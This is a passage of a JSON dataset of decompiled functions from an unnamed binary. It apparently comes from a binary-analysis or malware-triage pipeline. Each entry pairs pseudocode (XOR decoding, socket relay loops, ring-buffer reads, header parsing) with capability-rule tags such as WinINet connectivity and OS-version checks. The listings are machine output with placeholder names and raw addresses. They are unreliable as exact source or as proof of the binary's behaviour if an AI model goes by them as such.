var_4h = pcVar2 + 0xd;\n            var_18h = fcn.00078b7c(var_4h, 0x20, iVar3 - (var_4h - var_1a8h));\n            if ((var_18h != 0) && ((var_18h - var_4h) + 1U < 0x101)) {\n                var_9ch = fcn.000347a0(var_4h, &var_1a0h, var_18h - var_4h);\n                if (var_9ch != -1) {\n                    for (var_ch = 0; var_ch < var_9ch; var_ch = var_ch + 1) {\n                        *(&var_1a0h + var_ch) = *(&var_1a0h + var_ch) ^ *(var_ch + -0x7ff352d0);\n                    }\n                    *(&var_1a0h + var_9ch) = 0;\n                    fcn.000767a0(var_10h, &var_1a0h, var_9ch + 1, 0);\n                    iVar3 = fcn.00076860(var_10h, &var_1a4h, &var_14h, 20000, 0);\n                    if (iVar3 == 0) {\n                        if (var_14h == 4) {\n                            var_8h = *var_1a4h;\n                            fcn.00076a80(var_10h, var_1a4h);\n                            fcn.00078ad4(&var_98h, 0x800552d8, var_8h);\n                            var_248h = &var_98h;\n                            do {\n                                cVar1 = *var_248h;\n                                var_248h = var_248h + 1;\n                            } while (cVar1 != '\\0');\n                            iVar3 = fcn.00053270(*(var_1ach + 0x10), *(var_1ach + 0x14), &var_98h, \n                                                 var_248h - (&var_98h + 1));\n                            if (iVar3 == 0) {\n                                while (iVar3 = fcn.00076860(var_10h, &var_1a4h, &var_14h, 20000, 0),  iVar3 == 0) {\n                                    iVar3 = fcn.00053270(*(var_1ach + 0x10), *(var_1ach + 0x14), var_1a4h, var_14h);\n                                    if (iVar3 != 0) goto code_r0x0004ad65;\n                                    fcn.00076a80(var_10h, var_1a4h);\n                                }\n                                var_1a4h = NULL;\n                            }\n                        }\n                        else {\n                            fcn.00076a80(var_10h, var_1a4h);\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0004ad65:\n    fcn.000357f0(var_1a4h);\n    fcn.000761d0(&var_10h, 0);\n    fcn.000531d0(*(var_1ach + 0x10), *(var_1ach + 0x14));\n    fcn.00053350(var_1ach);\n    return 0;\n}\n",
        "token_count": 1381
    },
    "0004adb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.0004adb0(uint arg_8h, uint32_t arg_ch, int32_t *arg_10h, uint32_t *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = arg_8h;\n    if (arg_ch == 0) {\n        *arg_10h = 0;\n        *arg_14h = 0;\n        var_ch = 0;\n    }\n    else {\n        iVar1 = fcn.000356c0(arg_ch);\n        *arg_10h = iVar1;\n        if (*arg_10h == 0) {\n            var_ch = 0x21590004;\n        }\n        else {\n            *arg_14h = 0;\n            while (*arg_14h < arg_ch) {\n                var_8h = arg_ch - *arg_14h;\n                iVar1 = fcn.0004b290(var_4h, *arg_10h + *arg_14h, var_8h, &var_8h, 0);\n                if (iVar1 == 0) {\n                    var_ch = -1;\n                    goto code_r0x0004ae6b;\n                }\n                if (var_8h == 0) {\n                    var_ch = -1;\n                    goto code_r0x0004ae6b;\n                }\n                *arg_14h = *arg_14h + var_8h;\n            }\n            var_ch = 0;\n        }\ncode_r0x0004ae6b:\n        if (var_ch != 0) {\n            fcn.000357f0(*arg_10h);\n            *arg_10h = 0;\n            *arg_14h = 0;\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 462
    },
    "0004aea0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0004aea0(uint *arg_8h, uint *arg_ch, uint *arg_10h, uint32_t arg_14h)\n\n{\n    char cVar1;\n    uchar uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint var_22ch;\n    uint var_224h;\n    uint *var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint32_t var_214h;\n    uint var_210h;\n    uint var_208h;\n    uint *var_8h;\n    uint *var_4h;\n    \n    var_8h = arg_8h;\n    if ((arg_14h == 0) && ((*(arg_ch + 6) & 2) != 0)) {\n        uVar3 = fcn.00078a6e();\n        uVar3 = uVar3 & 0x8000001f;\n        if (uVar3 < 0) {\n            uVar3 = (uVar3 - 1 | 0xffffffe0) + 1;\n        }\n        arg_14h = uVar3 * 8;\n        arg_10h = &var_8h + uVar3 * -2;\n        var_4h = arg_10h;\n        for (var_214h = 0; var_214h < arg_14h; var_214h = var_214h + 1) {\n            uVar2 = fcn.00078a6e();\n            *var_4h = uVar2;\n            var_4h = var_4h + 1;\n        }\n    }\n    if ((var_8h[0x2f3] & 1) == 0) {\n        var_21ch = 0x8005533c;\n    }\n    else {\n        var_21ch = 0x80055260;\n    }\n    fcn.00078ad4(&var_210h, 0x80055348, arg_14h + 8, var_21ch);\n    var_220h = &var_210h;\n    do {\n        cVar1 = *var_220h;\n        var_220h = var_220h + 1;\n    } while (cVar1 != '\\0');\n    var_214h = var_220h - (&var_210h + 1);\n    *(&var_210h + var_214h) = *arg_ch;\n    *(&stack0xfffffdf1 + var_214h + -1) = arg_ch[1];\n    fcn.0006c2d0(&var_210h + var_214h);\n    if ((arg_14h != 0) && (arg_14h < 0x208 - (var_214h + 8))) {\n        fcn.000789fc(&var_208h + var_214h, arg_10h, arg_14h);\n        var_214h = var_214h + arg_14h;\n        arg_14h = 0;\n    }\n    iVar4 = fcn.00053270(*var_8h, var_8h[1], &var_210h, var_214h + 8);\n    if ((iVar4 == 0) && ((arg_14h == 0 || (iVar4 = fcn.00053270(*var_8h, var_8h[1], arg_10h, arg_14h),  iVar4 == 0)))) {\n        iVar4 = 0;\n    }\n    return iVar4;\n}\n",
        "token_count": 796
    },
    "0004b0e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0004b0e0(uint *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint var_1a4h;\n    uint var_19ch;\n    uint *var_198h;\n    uint var_194h;\n    uint var_18ch;\n    uint *var_188h;\n    uint var_184h;\n    uint var_17ch;\n    uint *var_178h;\n    uint var_174h;\n    uint var_170h;\n    int32_t var_108h;\n    uint *var_104h;\n    uint var_100h;\n    \n    var_104h = arg_8h;\n    puVar3 = 0x80055380;\n    puVar4 = &var_100h;\n    for (iVar2 = 0x12; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = *puVar3;\n    fcn.00078ad4(&var_170h, 0x800553cc, arg_ch);\n    var_178h = &var_170h;\n    do {\n        cVar1 = *var_178h;\n        var_178h = var_178h + 1;\n    } while (cVar1 != '\\0');\n    var_108h = var_178h - (&var_170h + 1);\n    puVar3 = &var_100h;\n    do {\n        var_188h = puVar3;\n        puVar3 = var_188h + 1;\n    } while (*var_188h != '\\0');\n    fcn.00078ad4(var_188h, 0x800553e0, var_108h);\n    var_198h = &var_100h;\n    do {\n        cVar1 = *var_198h;\n        var_198h = var_198h + 1;\n    } while (cVar1 != '\\0');\n    fcn.00053270(*var_104h, var_104h[1], &var_100h, var_198h - (&var_100h + 1));\n    fcn.00053270(*var_104h, var_104h[1], &var_170h, var_108h);\n    return;\n}\n",
        "token_count": 564
    },
    "0004b290": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0004b290(uint *arg_8h, int32_t arg_ch, uint32_t arg_10h, uint32_t *arg_14h, int32_t arg_18h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if (arg_8h[4] == 0) {\n        if (arg_10h < 0xbb9) {\n            iVar2 = fcn.000532b0(*arg_8h, arg_8h[1], arg_8h + 5, 3000, &var_4h, 60000);\n            if ((iVar2 != 0) || (var_4h == 0)) {\n                return 0;\n            }\n            arg_8h[3] = 0;\n            arg_8h[2] = var_4h % 3000;\n            arg_8h[4] = var_4h;\n            if (var_4h < arg_10h) {\n                *arg_14h = var_4h;\n            }\n            else {\n                *arg_14h = arg_10h;\n            }\n            fcn.00078be8(arg_ch, arg_8h + 5, *arg_14h);\n            if (arg_18h == 0) {\n                arg_8h[3] = *arg_14h % 3000;\n                arg_8h[4] = arg_8h[4] - *arg_14h;\n            }\n        }\n        else {\n            if (arg_18h != 0) {\n                return 0;\n            }\n            iVar2 = fcn.000532b0(*arg_8h, arg_8h[1], arg_ch, arg_10h, arg_14h, 60000);\n            if ((iVar2 != 0) || (*arg_14h == 0)) {\n                return 0;\n            }\n        }\n    }\n    else {\n        if (arg_8h[4] <= arg_10h && arg_10h != arg_8h[4]) {\n            arg_10h = arg_8h[4];\n        }\n        if (arg_8h[3] < arg_8h[2]) {\n            fcn.00078be8(arg_ch, arg_8h + arg_8h[3] + 0x14, arg_10h);\n        }\n        else {\n            uVar1 = 3000 - arg_8h[3];\n            if (arg_10h < uVar1) {\n                fcn.00078be8(arg_ch, arg_8h + arg_8h[3] + 0x14, arg_10h);\n            }\n            else {\n                fcn.00078be8(arg_ch, arg_8h + arg_8h[3] + 0x14, uVar1);\n                fcn.00078be8(arg_ch + uVar1, arg_8h + 5, arg_10h - uVar1);\n            }\n        }\n        if (arg_18h == 0) {\n            arg_8h[3] = (arg_8h[3] + arg_10h) % 3000;\n            arg_8h[4] = arg_8h[4] - arg_10h;\n        }\n        *arg_14h = arg_10h;\n    }\n    return 1;\n}\n",
        "token_count": 781
    },
    "0004b4b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0004b4b0(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h[4] == 3000) {\n        uVar1 = 0;\n    }\n    else {\n        if (arg_8h[4] == 0) {\n            arg_8h[4] = 0;\n            arg_8h[2] = 0;\n            arg_8h[3] = 0;\n            var_8h = fcn.000532b0(*arg_8h, arg_8h[1], arg_8h + 5, 3000, &var_4h, 60000);\n        }\n        else if (arg_8h[2] < arg_8h[3] || arg_8h[2] == arg_8h[3]) {\n            var_8h = fcn.000532b0(*arg_8h, arg_8h[1], arg_8h + arg_8h[2] + 0x14, arg_8h[3] - arg_8h[2], &var_4h, 60000);\n        }\n        else {\n            var_8h = fcn.000532b0(*arg_8h, arg_8h[1], arg_8h + arg_8h[2] + 0x14, 3000 - arg_8h[2], &var_4h, 60000);\n        }\n        if ((var_8h == 0) && (var_4h != 0)) {\n            arg_8h[2] = (arg_8h[2] + var_4h) % 3000;\n            arg_8h[4] = arg_8h[4] + var_4h;\n            uVar1 = 1;\n        }\n        else {\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 457
    },
    "0004b5f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.0004b5f0(int32_t arg_8h, uint32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    do {\n        iVar1 = fcn.0004b290(arg_10h, arg_8h, 0x5dc, arg_ch, 1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        if (*arg_ch < 5) {\n            return 0;\n        }\n        for (var_ch = 0;\n            (var_ch < *arg_ch &&\n            ((*(arg_8h + var_ch) == '\\n' || ((*(arg_8h + var_ch) == '\\r' && (*(arg_8h + var_ch + 1) == '\\n'))))));\n            var_ch = var_ch + 1) {\n        }\n        var_4h = 0;\n        for (; var_ch < *arg_ch; var_ch = var_ch + 1) {\n            if ((*(arg_8h + var_ch) == '\\r') && (var_ch = var_ch + 1,  *arg_ch <= var_ch)) {\n                return 0;\n            }\n            if (*(arg_8h + var_ch) == '\\n') {\n                uVar2 = var_ch + 1;\n                if (*arg_ch <= uVar2) {\n                    return 0;\n                }\n                if ((*(arg_8h + uVar2) == '\\r') && (uVar2 = var_ch + 2,  *arg_ch <= var_ch + 2)) {\n                    return 0;\n                }\n                var_ch = uVar2;\n                if (*(arg_8h + var_ch) == '\\n') {\n                    var_4h = 1;\n                    break;\n                }\n            }\n        }\n        if (var_4h != 0) {\n            *arg_ch = var_ch + 1;\n            iVar1 = fcn.0004b290(arg_10h, arg_8h, *arg_ch, &var_8h, 0);\n            if (iVar1 == 0) {\n                return 0;\n            }\n            if (var_8h != *arg_ch) {\n                return 0;\n            }\n            return 1;\n        }\n        iVar1 = fcn.0004b4b0(arg_10h);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 589
    },
    "0004b790": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0004b790(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t *arg_18h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_164h;\n    uint var_15ch;\n    uint *var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_148h;\n    uint *var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint *var_b8h;\n    uint *var_b4h;\n    int32_t var_b0h;\n    uint *var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_88h;\n    int32_t var_4h;\n    \n    var_140h = 0;\n    var_4h = 0;\n    fcn.0002c420(&var_88h, 0x80);\n    var_144h = &var_88h;\n    do {\n        cVar1 = *var_144h;\n        var_144h = var_144h + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = fcn.00075eb0(&var_4h, 0x800cb1a0, 0, 0, &var_88h, var_144h + (1 - (&var_88h + 1)), 2);\n    if ((iVar2 == 0) && (iVar2 = fcn.00076560(var_4h, 0),  iVar2 == 0)) {\n        if (arg_14h == 0) {\n            var_154h = 0x800517aa;\n        }\n        else {\n            var_154h = 0x800553f8;\n        }\n        fcn.0002c4c0(&var_138h, 0x80, 0x800553fc, var_154h);\n        fcn.00078bfa(&var_b8h, 0, 0x30);\n        var_b4h = &var_138h;\n        var_158h = &var_138h;\n        do {\n            cVar1 = *var_158h;\n            var_158h = var_158h + 1;\n        } while (cVar1 != '\\0');\n        var_b0h = var_158h - (&var_138h + 1);\n        var_b8h = &var_a8h;\n        var_a4h = arg_8h;\n        var_a0h = arg_ch;\n        var_a8h = &var_98h;\n        var_94h = 0x800517aa;\n        var_90h = 1;\n        iVar2 = fcn.00076cb0(var_4h, &var_b8h, 0);\n        if (iVar2 == 0) {\n            if (arg_18h != NULL) {\n                *arg_18h = var_4h;\n                var_4h = 0;\n            }\n            var_140h = 1;\n        }\n    }\n    if (var_4h != 0) {\n        fcn.000761d0(&var_4h, 0);\n    }\n    return var_140h;\n}\n",
        "token_count": 768
    },
    "0004b9b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.0004b9b0(void)\n\n{\n    char *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_18h;\n    uint var_10h;\n    char *var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.000294e0(0x2f1, 0x800cda28, 0x52, 0x800ce950);\n    if (var_4h == 0) {\n        iVar3 = fcn.000294e0(0x2f2, 0x800cd9d0, 0x52, &var_8h);\n        if (iVar3 == 0) {\n            var_ch = 0x800cda28;\n            pcVar1 = var_ch;\n            do {\n                var_ch = pcVar1;\n                pcVar1 = var_ch + 1;\n            } while (*var_ch != '\\0');\n            *0x800ce950 = var_ch + 0x7ff325d8;\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = iVar3 + 0x191U | 0x21590000;\n        }\n    }\n    else {\n        uVar2 = var_4h + 0x191U | 0x21590000;\n    }\n    return uVar2;\n}\n",
        "token_count": 320
    },
    "0004ba60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0004ba60(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t *var_54h;\n    int32_t *var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t *var_3ch;\n    int32_t *var_38h;\n    uint32_t var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    uint32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    uint32_t var_4h;\n    \n    if (*0x800ce950 == 0) {\n        return 0;\n    }\n    if (arg_ch <= *0x800ce950 + 0x11) {\n        return 0;\n    }\n    var_8h = 0x80055404;\n    var_ch = arg_8h;\n    for (var_4h = 5; 3 < var_4h; var_4h = var_4h - 4) {\n        if (*var_ch != *var_8h) goto code_r0x0004bac2;\n        var_8h = var_8h + 1;\n        var_ch = var_ch + 1;\n    }\n    if (var_4h == 0) {\ncode_r0x0004bb44:\n        var_14h = 0;\n    }\n    else {\ncode_r0x0004bac2:\n        var_10h = *var_ch - *var_8h;\n        if (var_10h == 0) {\n            if (var_4h == 1) goto code_r0x0004bb44;\n            var_10h = *(var_ch + 1) - *(var_8h + 1);\n            if (var_10h == 0) {\n                if (var_4h == 2) goto code_r0x0004bb44;\n                var_10h = *(var_ch + 2) - *(var_8h + 2);\n                if (var_10h == 0) {\n                    if ((var_4h == 3) || (var_10h = *(var_ch + 3) - *(var_8h + 3),  var_10h == 0))\n                    goto code_r0x0004bb44;\n                }\n            }\n        }\n        var_14h = 1;\n        if (var_10h < 1) {\n            var_14h = -1;\n        }\n    }\n    if (var_14h == 0) {\n        var_20h = 0x800cda28;\n        var_24h = arg_8h + 1;\n        for (var_1ch = *0x800ce950; 3 < var_1ch; var_1ch = var_1ch - 4) {\n            if (*var_24h != *var_20h) goto code_r0x0004bbb4;\n            var_20h = var_20h + 1;\n            var_24h = var_24h + 1;\n        }\n        if (var_1ch == 0) {\ncode_r0x0004bc36:\n            var_2ch = 0;\n        }\n        else {\ncode_r0x0004bbb4:\n            var_28h = *var_24h - *var_20h;\n            if (var_28h == 0) {\n                if (var_1ch == 1) goto code_r0x0004bc36;\n                var_28h = *(var_24h + 1) - *(var_20h + 1);\n                if (var_28h == 0) {\n                    if (var_1ch == 2) goto code_r0x0004bc36;\n                    var_28h = *(var_24h + 2) - *(var_20h + 2);\n                    if (var_28h == 0) {\n                        if ((var_1ch == 3) || (var_28h = *(var_24h + 3) - *(var_20h + 3),  var_28h == 0))\n                        goto code_r0x0004bc36;\n                    }\n                }\n            }\n            var_2ch = 1;\n            if (var_28h < 1) {\n                var_2ch = -1;\n            }\n        }\n        if (var_2ch == 0) {\n            return 1;\n        }\n    }\n    var_38h = 0x8005540c;\n    var_3ch = arg_8h;\n    for (var_34h = 6; 3 < var_34h; var_34h = var_34h - 4) {\n        if (*var_3ch != *var_38h) goto code_r0x0004bca1;\n        var_38h = var_38h + 1;\n        var_3ch = var_3ch + 1;\n    }\n    if (var_34h == 0) {\ncode_r0x0004bd23:\n        var_44h = 0;\n    }\n    else {\ncode_r0x0004bca1:\n        var_40h = *var_3ch - *var_38h;\n        if (var_40h == 0) {\n            if (var_34h == 1) goto code_r0x0004bd23;\n            var_40h = *(var_3ch + 1) - *(var_38h + 1);\n            if (var_40h == 0) {\n                if (var_34h == 2) goto code_r0x0004bd23;\n                var_40h = *(var_3ch + 2) - *(var_38h + 2);\n                if (var_40h == 0) {\n                    if ((var_34h == 3) || (var_40h = *(var_3ch + 3) - *(var_38h + 3),  var_40h == 0))\n                    goto code_r0x0004bd23;\n                }\n            }\n        }\n        var_44h = 1;\n        if (var_40h < 1) {\n            var_44h = -1;\n        }\n    }\n    if (var_44h != 0) {\n        return 0;\n    }\n    var_50h = 0x800cda28;\n    var_54h = arg_8h + 5;\n    for (var_4ch = *0x800ce950; 3 < var_4ch; var_4ch = var_4ch - 4) {\n        if (*var_54h != *var_50h) goto code_r0x0004bd93;\n        var_50h = var_50h + 1;\n        var_54h = var_54h + 1;\n    }\n    if (var_4ch == 0) {\ncode_r0x0004be15:\n        var_5ch = 0;\n    }\n    else {\ncode_r0x0004bd93:\n        var_58h = *var_54h - *var_50h;\n        if (var_58h == 0) {\n            if (var_4ch == 1) goto code_r0x0004be15;\n            var_58h = *(var_54h + 1) - *(var_50h + 1);\n            if (var_58h == 0) {\n                if (var_4ch == 2) goto code_r0x0004be15;\n                var_58h = *(var_54h + 2) - *(var_50h + 2);\n                if (var_58h == 0) {\n                    if ((var_4ch == 3) || (var_58h = *(var_54h + 3) - *(var_50h + 3),  var_58h == 0))\n                    goto code_r0x0004be15;\n                }\n            }\n        }\n        var_5ch = 1;\n        if (var_58h < 1) {\n            var_5ch = -1;\n        }\n    }\n    if (var_5ch != 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 1967
    },
    "0004be60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0004be60(int32_t arg_8h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint var_698h;\n    uint var_690h;\n    char *var_68ch;\n    uint var_688h;\n    int32_t var_608h;\n    int32_t var_604h;\n    uint var_600h;\n    uint var_5fch;\n    uint var_5f8h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_608h = arg_8h;\n    var_600h = 0;\n    var_5fch = 0;\n    var_8h = 0;\n    var_68ch = 0x800cd9d0;\n    pcVar1 = var_68ch;\n    do {\n        var_68ch = pcVar1;\n        pcVar1 = var_68ch + 1;\n    } while (*var_68ch != '\\0');\n    var_604h = fcn.00075eb0(&var_4h, 0x800cad18, 0, 0, 0x800cd9d0, var_68ch + 0x7ff32631, 2);\n    if (var_604h == 0) {\n        fcn.00078bfa(&var_688h, 0, 0x80);\n        fcn.0002c4c0(&var_688h, 0x7f, 0x80055414, *(var_608h + 0x20));\n        var_604h = fcn.000766e0(var_4h, &var_688h, 0);\n        if ((var_604h == 0) && (var_604h = fcn.00076560(var_4h, 0),  var_604h == 0)) {\n            var_10h = var_4h;\n            var_ch = *(var_608h + 0x10);\n            var_8h = *(var_608h + 0x14);\n            var_604h = fcn.0001ace0(&var_600h, 0x8008c110, &var_10h);\n            if (var_604h == 0) {\n                if (*(var_608h + 0x610) == 0) goto code_r0x0004c03e;\n                var_604h = fcn.000767a0(var_4h, var_608h + 0x34, *(var_608h + 0x610), 0);\n                while (var_604h == 0) {\ncode_r0x0004c03e:\n                    var_604h = fcn.000532b0(*(var_608h + 0x10), *(var_608h + 0x14), &var_5f8h, 0x5dc, &var_14h, 60000);\n                    if (var_604h != 0) break;\n                    var_604h = fcn.000767a0(var_4h, &var_5f8h, var_14h, 0);\n                }\n            }\n        }\n    }\n    fcn.000761d0(&var_4h, 0);\n    iVar2 = fcn.00037730(&var_600h);\n    if (iVar2 == 0) {\n        if (var_8h != 0) {\n            fcn.000531d0(*(var_608h + 0x10), *(var_608h + 0x14));\n        }\n    }\n    else {\n        fcn.00037760(&var_600h, 0);\n        fcn.00037710(&var_600h);\n    }\n    fcn.00053350(var_608h);\n    return 0;\n}\n",
        "token_count": 878
    },
    "0004c110": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.0004c110(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_4h = arg_8h;\n    do {\n        iVar1 = fcn.00076860(*var_4h, &var_ch, &var_8h, 0xffffffff, 0);\n        if (iVar1 != 0) {\ncode_r0x0004c184:\n            if (var_4h[2] != 0) {\n                fcn.000531d0(var_4h[1], var_4h[2]);\n                var_4h[2] = 0;\n            }\n            return 0;\n        }\n        iVar1 = fcn.00053270(var_4h[1], var_4h[2], var_ch, var_8h);\n        if (iVar1 != 0) {\n            fcn.00076a80(*var_4h, var_ch);\n            goto code_r0x0004c184;\n        }\n        fcn.00076a80(*var_4h, var_ch);\n    } while( true );\n}\n",
        "token_count": 304
    },
    "0004c1c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0004c1c0(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (arg_10h == 0) {\n        iVar1 = fcn.0004ccc0(arg_8h, arg_ch);\n        if (iVar1 != 0) {\n            return 9;\n        }\n    }\n    else {\n        iVar1 = fcn.0004c260(arg_8h, arg_ch);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        iVar1 = fcn.0004c2b0(arg_8h, arg_ch);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        iVar1 = fcn.00049bb0(arg_8h, arg_ch);\n        if (iVar1 != 0) {\n            return 5;\n        }\n        iVar1 = fcn.0004ba60(arg_8h, arg_ch);\n        if (iVar1 != 0) {\n            return 0xb;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 257
    },
    "0004c2b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0004c2b0(int32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t *var_30h;\n    int32_t *var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint8_t var_6h;\n    uint8_t *var_4h;\n    \n    if (arg_ch < 0x1f) {\n        return 0;\n    }\n    var_14h = 0x80055404;\n    var_18h = arg_8h;\n    for (var_10h = 5; 3 < var_10h; var_10h = var_10h - 4) {\n        if (*var_18h != *var_14h) goto code_r0x0004c2ff;\n        var_14h = var_14h + 1;\n        var_18h = var_18h + 1;\n    }\n    if (var_10h == 0) {\ncode_r0x0004c381:\n        var_20h = 0;\n    }\n    else {\ncode_r0x0004c2ff:\n        var_1ch = *var_18h - *var_14h;\n        if (var_1ch == 0) {\n            if (var_10h == 1) goto code_r0x0004c381;\n            var_1ch = *(var_18h + 1) - *(var_14h + 1);\n            if (var_1ch == 0) {\n                if (var_10h == 2) goto code_r0x0004c381;\n                var_1ch = *(var_18h + 2) - *(var_14h + 2);\n                if (var_1ch == 0) {\n                    if ((var_10h 